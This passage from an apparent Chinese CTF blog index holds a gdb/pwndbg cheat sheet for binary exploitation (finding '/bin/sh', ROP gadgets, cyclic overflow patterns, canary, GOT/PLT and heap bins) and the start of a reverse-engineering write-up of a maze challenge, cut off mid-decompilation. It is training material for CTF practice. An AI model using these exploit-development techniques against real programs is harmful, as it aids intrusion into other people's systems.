class="line">find &quot;&#x2F;bin&#x2F;sh&quot;          查找&#x2F;bin&#x2F;sh字符串</span><br><span class="line">ropgadget               查找ropgadget，pwndbg独有，没啥用，可以用其他工具</span><br><span class="line"></span><br><span class="line">x&#x2F;&lt;n&#x2F;f&#x2F;u&gt; &lt;addr&gt;         查看内存</span><br><span class="line">n、f、u是可选的参数。</span><br><span class="line">n是一个正整数，表示显示内存的长度，也就是说从当前地址向后显示几个地址的内容。</span><br><span class="line">f 表示显示的格式，参见上面。如果地址所指的是字符串，那么格式可以是s，如果 地址是指令地址，那么格式可以是i。</span><br><span class="line">u 表示从当前地址往后请求的字节数，如果不指定的话，GDB默认是4个bytes。</span><br><span class="line">u参数可以用下面的字符来代替，</span><br><span class="line">b表示单字节，</span><br><span class="line">h表示双字节，</span><br><span class="line">w表示四字节，</span><br><span class="line">g表示八字节。</span><br><span class="line">当我们指定了字节长度后，GDB会从指内存定的内存地址开始，读写指定字节，并把其当作一个值取出来。</span><br><span class="line">&lt;addr&gt;表示一个内存地址。</span><br><span class="line">n&#x2F;f&#x2F;u三个参数可以一起使用。例如：</span><br><span class="line">命令：x&#x2F;3uh 0x54320 表示，从内存地址0x54320读取内容，h表示以双字节为一个单位，3表示三个单位，u表示按十六进制显示。</span><br><span class="line">x 按十六进制格式显示变量。</span><br><span class="line">d 按十进制格式显示变量。</span><br><span class="line">u 按十六进制格式显示无符号整型。</span><br><span class="line">o 按八进制格式显示变量。</span><br><span class="line">t 按二进制格式显示变量。</span><br><span class="line">a 按十六进制格式显示变量。</span><br><span class="line">c 按字符格式显示变量。</span><br><span class="line">f 按浮点数格式显示变量。</span><br><span class="line">s 按字符串显示。</span><br><span class="line">b 按字符显示。</span><br><span class="line">i 显示汇编指令。</span><br><span class="line"></span><br><span class="line">arena                   显示arena信息</span><br><span class="line">bins                    查看所有种类的堆块的链表情况</span><br><span class="line">fastbins                查看fastbins的链表情况</span><br><span class="line">largebins               查看largebins的链表情况</span><br><span class="line">smallbins               查看smallbins的链表情况</span><br><span class="line">unsortedbin             查看unsortedbin链表情况</span><br><span class="line">tcachebins              查看tcachebins的链表情况</span><br><span class="line">tcache                  查看tcache信息</span><br><span class="line">heap                    数据结构的形式显示所有堆块，会显示一大堆</span><br><span class="line">heapbase                查看堆起始地址</span><br><span class="line">heapinfo、heapinfoall    显示堆得信息，和bins的挺像的，没bins好用</span><br><span class="line">parseheap               显示堆结构，很好用</span><br><span class="line">tracemalloc             好用，会跟提示所有操作堆的地方</span><br><span class="line">cyclc 50                生成50个用来溢出的字符，如：aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama</span><br><span class="line">canary                  查看canary的值</span><br><span class="line">plt                     查看plt表</span><br><span class="line">got                     查看got表</span><br><span class="line">elfheader               从调试的elf文件获取头信息</span><br><span class="line">attach 20154            调试 20154端口运行的程序</span><br><span class="line">loadsym libc路径        链接该路径的libc</span><br></pre></td></tr></table></figure><h3 id="更新Ubuntu后vmtools失效"><a href="#更新Ubuntu后vmtools失效" class="headerlink" title="更新Ubuntu后vmtools失效"></a>更新Ubuntu后vmtools失效</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/vmware-config-tools.pl</span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://qingmu-z.github.io/2021/10/01/pwn/pwn%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/">pwn环境配置</a></li><li><a href="https://blog.csdn.net/weixin_43848614/article/details/117260662">【Linux】Ubuntu 20.04安装教程（图文详解）</a></li><li><a href="https://nuoye-blog.github.io/2020/08/29/2307c607/">记Ubuntu 20.04环境搭建</a></li><li><a href="https://blog.csdn.net/juluwangriyue/article/details/108617283">Linux使用patchelf工具</a></li><li><a href="https://ctf-wiki.org/">ctf-wiki</a></li><li><a href="https://bbs.pediy.com/thread-254868.htm">[原创]关于不同版本 glibc 更换的一些问题</a></li><li><a href="https://blog.csdn.net/feimeng116/article/details/105837483">在Ubuntu 20.04中安装Pycharm 2020.1</a></li><li><a href="https://blog.csdn.net/kouyi5627/article/details/80531442?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-13&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-13">Python在终端通过pip安装好包以后，在Pycharm中依然无法使用的解决办法</a></li><li><a href="https://blog.csdn.net/qq_40808344/article/details/85224470">如何将python的本地库同步到pycharm下</a></li><li><a href="https://www.cnblogs.com/zhwer/p/12494317.html">gdb/pwndbg 常用命令简单整理</a></li><li><a href="https://blog.csdn.net/Breeze_CAT/article/details/103789233">[pwn]调试：gdb+pwndbg食用指南</a></li><li><a href="https://github.com/pwndbg/pwndbg/blob/dev/FEATURES.md">pwndbg官方文档</a></li><li><a href></a></li><li><a href></a></li><li><a href></a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwn </category>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-pwn-知识点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfwiki-re</title>
      <link href="/2021/10/08/ctfwiki-re/"/>
      <url>/2021/10/08/ctfwiki-re/</url>
      
        <content type="html"><![CDATA[<h1 id="Reverse-100"><a href="#Reverse-100" class="headerlink" title="Reverse 100"></a>Reverse 100</h1><p>64位程序，无壳，拖入ida中反编译<br>查看main函数，可猜出本题为迷宫</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_400720</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  __int64 v7; <span class="comment">// rax</span></span><br><span class="line">  __int64 v8; <span class="comment">// rax</span></span><br><span class="line">  __int64 v9; <span class="comment">// rax</span></span><br><span class="line">  __int64 v10; <span class="comment">// rax</span></span><br><span class="line">  __int64 v11; <span class="comment">// rax</span></span><br><span class="line">  __int64 v12; <span class="comment">// rax</span></span><br><span class="line">  __int64 v13; <span class="comment">// rax</span></span><br><span class="line">  __int64 v14; <span class="comment">// rax</span></span><br><span class="line">  __int64 v15; <span class="comment">// rax</span></span><br><span class="line">  __int64 v16; <span class="comment">// rax</span></span><br><span class="line">  __int64 v17; <span class="comment">// rax</span></span><br><span class="line">  __int64 v18; <span class="comment">// rax</span></span><br><span class="line">  __int64 v19; <span class="comment">// rax</span></span><br><span class="line">  __int64 v20; <span class="comment">// rax</span></span><br><span class="line">  __int64 v21; <span class="comment">// rax</span></span><br><span class="line">  __int64 v22; <span class="comment">// rax</span></span><br><span class="line">  __int64 v23; <span class="comment">// rax</span></span><br><span class="line">  __int64 v24; <span class="comment">// rax</span></span><br><span class="line">  __int64 v25; <span class="comment">// rax</span></span><br><span class="line">  __int64 v26; <span class="comment">// rax</span></span><br><span class="line">  __int64 v27; <span class="comment">// rax</span></span><br><span class="line">  __int64 v28; <span class="comment">// rax</span></span><br><span class="line">  __int64 v29; <span class="comment">// rax</span></span><br><span class="line">  __int64 v30; <span class="comment">// rax</span></span><br><span class="line">  __int64 v31; <span class="comment">// rax</span></span><br><span class="line">  __int64 v32; <span class="comment">// rax</span></span><br><span class="line">  __int64 v33; <span class="comment">// rax</span></span><br><span class="line">  __int64 v34; <span class="comment">// rax</span></span><br><span class="line">  __int64 v35; <span class="comment">// rax</span></span><br><span class="line">  _QWORD *v36; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v37; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v38; <span class="comment">// er12</span></span><br><span class="line">  _QWORD *v39; <span class="comment">// rax</span></span><br><span class="line">  __int64 *v40; <span class="comment">// rax</span></span><br><span class="line">  __int64 *v41; <span class="comment">// rax</span></span><br><span class="line">  __int64 *v42; <span class="comment">// rax</span></span><br><span class="line">  __int64 *v43; <span class="comment">// rax</span></span><br><span class="line">  __int64 v44; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v45; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v47[<span class="number">44</span>]; <span class="comment">// [rsp+0h] [rbp-D0h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v48; <span class="comment">// [rsp+2Ch] [rbp-A4h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v49; <span class="comment">// [rsp+2Dh] [rbp-A3h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v50; <span class="comment">// [rsp+2Eh] [rbp-A2h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v51; <span class="comment">// [rsp+2Fh] [rbp-A1h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v52; <span class="comment">// [rsp+30h] [rbp-A0h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v53; <span class="comment">// [rsp+34h] [rbp-9Ch] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v54; <span class="comment">// [rsp+38h] [rbp-98h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v55; <span class="comment">// [rsp+3Ch] [rbp-94h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v56; <span class="comment">// [rsp+40h] [rbp-90h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v57; <span class="comment">// [rsp+44h] [rbp-8Ch] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v58; <span class="comment">// [rsp+48h] [rbp-88h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v59; <span class="comment">// [rsp+4Ch] [rbp-84h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v60; <span class="comment">// [rsp+50h] [rbp-80h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v61; <span class="comment">// [rsp+54h] [rbp-7Ch] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v62; <span class="comment">// [rsp+58h] [rbp-78h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v63; <span class="comment">// [rsp+5Ch] [rbp-74h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v64; <span class="comment">// [rsp+60h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v65; <span class="comment">// [rsp+64h] [rbp-6Ch] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v66; <span class="comment">// [rsp+68h] [rbp-68h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v67; <span class="comment">// [rsp+6Ch] [rbp-64h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v68; <span class="comment">// [rsp+70h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v69; <span class="comment">// [rsp+74h] [rbp-5Ch] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v70; <span class="comment">// [rsp+78h] [rbp-58h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v71; <span class="comment">// [rsp+7Ch] [rbp-54h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v72; <span class="comment">// [rsp+80h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v73; <span class="comment">// [rsp+84h] [rbp-4Ch] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v74; <span class="comment">// [rsp+88h] [rbp-48h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v75; <span class="comment">// [rsp+8Ch] [rbp-44h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v76; <span class="comment">// [rsp+90h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v77; <span class="comment">// [rsp+94h] [rbp-3Ch] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v78; <span class="comment">// [rsp+98h] [rbp-38h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v79; <span class="comment">// [rsp+9Ch] [rbp-34h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v80; <span class="comment">// [rsp+A0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v81; <span class="comment">// [rsp+A4h] [rbp-2Ch] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v82; <span class="comment">// [rsp+A8h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v83; <span class="comment">// [rsp+ACh] [rbp-24h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v84; <span class="comment">// [rsp+B0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v85; <span class="comment">// [rsp+B4h] [rbp-1Ch] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v86; <span class="comment">// [rsp+B8h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v87; <span class="comment">// [rsp+BFh] [rbp-11h]</span></span><br><span class="line"></span><br><span class="line">  v87 = <span class="number">1</span>;</span><br><span class="line">  sub_40129E(&amp;v49);</span><br><span class="line">  sub_401338(v47, <span class="number">11L</span>L, &amp;v51, &amp;v50, &amp;v49);</span><br><span class="line">  sub_4012B8(&amp;v49);</span><br><span class="line">  v52 = <span class="number">0</span>;</span><br><span class="line">  v0 = sub_4013D0(v47, &amp;v52);                  </span><br><span class="line">  sub_440CE0(v0, <span class="string">&quot;**########################################################################################&quot;</span>);</span><br><span class="line">  v53 = <span class="number">10</span>;</span><br><span class="line">  v1 = sub_4013D0(v47, &amp;v53);                  </span><br><span class="line">  sub_440CE0(v1, <span class="string">&quot;#************######*##############**************##*####*#######*##*##*###*#####*####*#####&quot;</span>);</span><br><span class="line">  v54 = <span class="number">22</span>;</span><br><span class="line">  v2 = sub_4013D0(v47, &amp;v54);                   </span><br><span class="line">  sub_440CE0(v2, <span class="string">&quot;###*#########*****************************************************************############&quot;</span>);</span><br><span class="line">  v55 = <span class="number">24</span>;</span><br><span class="line">  v3 = sub_4013D0(v47, &amp;v55);                  </span><br><span class="line">  sub_440CE0(v3, <span class="string">&quot;###*#########*###############################################*######*****************#####&quot;</span>);</span><br><span class="line">  v56 = <span class="number">21</span>;</span><br><span class="line">  v4 = sub_4013D0(v47, &amp;v56);                  </span><br><span class="line">  sub_440CE0(v4, <span class="string">&quot;###**********#############################################################################&quot;</span>);</span><br><span class="line">  v57 = <span class="number">1</span>;</span><br><span class="line">  v5 = sub_4013D0(v47, &amp;v57);                </span><br><span class="line">  sub_440CE0(v5, <span class="string">&quot;#*######################*******************************************#####*************#####&quot;</span>);</span><br><span class="line">  v58 = <span class="number">20</span>;</span><br><span class="line">  v6 = sub_4013D0(v47, &amp;v58);                </span><br><span class="line">  sub_440CE0(v6, <span class="string">&quot;############*#####*******************************************************************#####&quot;</span>);</span><br><span class="line">  v59 = <span class="number">15</span>;</span><br><span class="line">  v7 = sub_4013D0(v47, &amp;v59);                  </span><br><span class="line">  sub_440CE0(v7, <span class="string">&quot;###*#################################################*#########*##*######*#####*####*#####&quot;</span>);</span><br><span class="line">  v60 = <span class="number">16</span>;</span><br><span class="line">  v8 = sub_4013D0(v47, &amp;v60);               </span><br><span class="line">  sub_440CE0(v8, <span class="string">&quot;###*####*****#####**********************#############*#########*##********#####*####*#####&quot;</span>);</span><br><span class="line">  v61 = <span class="number">2</span>;</span><br><span class="line">  v9 = sub_4013D0(v47, &amp;v61);            </span><br><span class="line">  sub_440CE0(v9, <span class="string">&quot;#************************####*####################################*#####*###########*#####&quot;</span>);</span><br><span class="line">  v62 = <span class="number">18</span>;</span><br><span class="line">  v10 = sub_4013D0(v47, &amp;v62);         </span><br><span class="line">  sub_440CE0(v10, <span class="string">&quot;###*####*###*#####*############################################*****************####*#####&quot;</span>);</span><br><span class="line">  v63 = <span class="number">17</span>;</span><br><span class="line">  v11 = sub_4013D0(v47, &amp;v63);                 </span><br><span class="line">  sub_440CE0(v11, <span class="string">&quot;###*####*###*#####*####################***************#########*###############*####*#####&quot;</span>);</span><br><span class="line">  v64 = <span class="number">3</span>;</span><br><span class="line">  v12 = sub_4013D0(v47, &amp;v64);                 </span><br><span class="line">  sub_440CE0(v12, <span class="string">&quot;#########*#########*#########*#######***************************##*#####*###########*#####&quot;</span>);</span><br><span class="line">  v65 = <span class="number">26</span>;</span><br><span class="line">  v13 = sub_4013D0(v47, &amp;v65);          </span><br><span class="line">  sub_440CE0(v13, <span class="string">&quot;#############################################################*######*#####################&quot;</span>);</span><br><span class="line">  v66 = <span class="number">4</span>;</span><br><span class="line">  v14 = sub_4013D0(v47, &amp;v66);               </span><br><span class="line">  sub_440CE0(v14, <span class="string">&quot;#******##*#########*#########*#######*#########################*##*#####*###########*#####&quot;</span>);</span><br><span class="line">  v67 = <span class="number">5</span>;</span><br><span class="line">  v15 = sub_4013D0(v47, &amp;v67);                </span><br><span class="line">  sub_440CE0(v15, <span class="string">&quot;#*####*##*#########*#########*#######*#########################*##*#####********####*#####&quot;</span>);</span><br><span class="line">  v68 = <span class="number">19</span>;</span><br><span class="line">  v16 = sub_4013D0(v47, &amp;v68);                  </span><br><span class="line">  sub_440CE0(v16, <span class="string">&quot;###******###*#####*#################################################################*#####&quot;</span>);</span><br><span class="line">  v69 = <span class="number">23</span>;</span><br><span class="line">  v17 = sub_4013D0(v47, &amp;v69);                  </span><br><span class="line">  sub_440CE0(v17, <span class="string">&quot;###*#########*###############################################*############################&quot;</span>);</span><br><span class="line">  v70 = <span class="number">6</span>;</span><br><span class="line">  v18 = sub_4013D0(v47, &amp;v70);                  </span><br><span class="line">  sub_440CE0(v18, <span class="string">&quot;#*####*##*#########*######*******####*###**********####****####*##*############*####*#####&quot;</span>);</span><br><span class="line">  v71 = <span class="number">7</span>;</span><br><span class="line">  v19 = sub_4013D0(v47, &amp;v71);                 </span><br><span class="line">  sub_440CE0(v19, <span class="string">&quot;#*##***#**#########*#################*###*########*####*#######*##*############*####*#####&quot;</span>);</span><br><span class="line">  v72 = <span class="number">25</span>;</span><br><span class="line">  v20 = sub_4013D0(v47, &amp;v72);             </span><br><span class="line">  sub_440CE0(v20, <span class="string">&quot;###**************************************************########*######*#####################&quot;</span>);</span><br><span class="line">  v73 = <span class="number">8</span>;</span><br><span class="line">  v21 = sub_4013D0(v47, &amp;v73);                 </span><br><span class="line">  sub_440CE0(v21, <span class="string">&quot;#*##*###*##########*##############****###*******##*####*#######*##*##*****#####*####*#####&quot;</span>);</span><br><span class="line">  v74 = <span class="number">9</span>;</span><br><span class="line">  v22 = sub_4013D0(v47, &amp;v74);             </span><br><span class="line">  sub_440CE0(v22, <span class="string">&quot;#*##*###*##########*##############*############*##*####*#######*##*##*###*#####*####*#####&quot;</span>);</span><br><span class="line">  v75 = <span class="number">11</span>;</span><br><span class="line">  v23 = sub_4013D0(v47, &amp;v75);              </span><br><span class="line">  sub_440CE0(v23, <span class="string">&quot;###################*##############################*####***#####*##*##*###*#####*####*#####&quot;</span>);</span><br><span class="line">  v76 = <span class="number">12</span>;</span><br><span class="line">  v24 = sub_4013D0(v47, &amp;v76);                </span><br><span class="line">  sub_440CE0(v24, <span class="string">&quot;###################********************************############*##*##*###*#####*####*#####&quot;</span>);</span><br><span class="line">  v77 = <span class="number">13</span>;</span><br><span class="line">  v25 = sub_4013D0(v47, &amp;v77);                  </span><br><span class="line">  sub_440CE0(v25, <span class="string">&quot;###############################################################*##*##*###*#####*####*#####&quot;</span>);</span><br><span class="line">  v78 = <span class="number">28</span>;</span><br><span class="line">  v26 = sub_4013D0(v47, &amp;v78);              </span><br><span class="line">  sub_440CE0(v26, <span class="string">&quot;#########################*****************************************************************&quot;</span>);</span><br><span class="line">  v79 = <span class="number">14</span>;</span><br><span class="line">  v27 = sub_4013D0(v47, &amp;v79);           </span><br><span class="line">  sub_440CE0(v27, <span class="string">&quot;###***************************************************#########*##*##*###*#####*####*#####&quot;</span>);</span><br><span class="line">  v80 = <span class="number">27</span>;</span><br><span class="line">  v28 = sub_4013D0(v47, &amp;v80);                  </span><br><span class="line">  sub_440CE0(v28, <span class="string">&quot;#############################################################*######*#####################&quot;</span>);</span><br><span class="line">  v81 = <span class="number">29</span>;</span><br><span class="line">  v29 = sub_4013D0(v47, &amp;v81);                  </span><br><span class="line">  sub_440CE0(v29, <span class="string">&quot;#*#######*####**###*#######***#######*########**###*******##*****##########################&quot;</span>);</span><br><span class="line">  v82 = <span class="number">30</span>;</span><br><span class="line">  v30 = sub_4013D0(v47, &amp;v82);                  </span><br><span class="line">  sub_440CE0(v30, <span class="string">&quot;##*#####*###*###*##*######*#########*#*######*##*#####*#####*##############################&quot;</span>);</span><br><span class="line">  v83 = <span class="number">31</span>;</span><br><span class="line">  v31 = sub_4013D0(v47, &amp;v83);                  </span><br><span class="line">  sub_440CE0(v31, <span class="string">&quot;###*###*####*###*##*######*##**####*###*####*#########*#####***############################&quot;</span>);</span><br><span class="line">  v84 = <span class="number">32</span>;</span><br><span class="line">  v32 = sub_4013D0(v47, &amp;v84);                  </span><br><span class="line">  sub_440CE0(v32, <span class="string">&quot;####*#*#####*###*##*##*###*###*###*******####*##*#####*#####*##############################&quot;</span>);</span><br><span class="line">  v85 = <span class="number">33</span>;</span><br><span class="line">  v33 = sub_4013D0(v47, &amp;v85);                  </span><br><span class="line">  sub_440CE0(v33, <span class="string">&quot;#####*#######**####****####**####*#######*####**######*#####*##############################&quot;</span>);</span><br><span class="line">  v86 = <span class="number">0</span>;</span><br><span class="line">  v34 = sub_4013D0(v47, &amp;v86);</span><br><span class="line">  v35 = sub_43F820(v34);</span><br><span class="line">  v36 = sub_407C60(qword_73EFA0, v35);</span><br><span class="line">  sub_407610(v36, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( v87 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_420230(&amp;unk_73F0C0, &amp;v48);</span><br><span class="line">    <span class="keyword">if</span> ( v48 == <span class="string">&#x27;L&#x27;</span> )                           <span class="comment">// 左移</span></span><br><span class="line">    &#123;</span><br><span class="line">      --x;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v48 &gt; <span class="string">&#x27;L&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v48 == <span class="string">&#x27;R&#x27;</span> )                         <span class="comment">// 右移</span></span><br><span class="line">      &#123;</span><br><span class="line">        ++x;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v48 == <span class="string">&#x27;U&#x27;</span> )                         <span class="comment">// 上移</span></span><br><span class="line">      &#123;</span><br><span class="line">        --y;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v48 == <span class="string">&#x27;D&#x27;</span> )                      <span class="comment">// 下移</span></span><br><span class="line">    &#123;</span><br><span class="line">      ++y;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">    &#125;</span><br><span class="line">    v87 = <span class="number">0</span>;</span><br><span class="line">LABEL_14:</span><br><span class="line">    v37 = y;</span><br><span class="line">    v38 = x;</span><br><span class="line">    v39 = sub_407670(qword_73EFA0, v48);</span><br><span class="line">    v40 = sub_407610(v39, <span class="string">&quot; &quot;</span>);</span><br><span class="line">    v41 = sub_4079B0(v40, v38);</span><br><span class="line">    v42 = sub_407610(v41, <span class="string">&quot; &quot;</span>);</span><br><span class="line">    v43 = sub_4079B0(v42, v37);</span><br><span class="line">    sub_407610(v43, <span 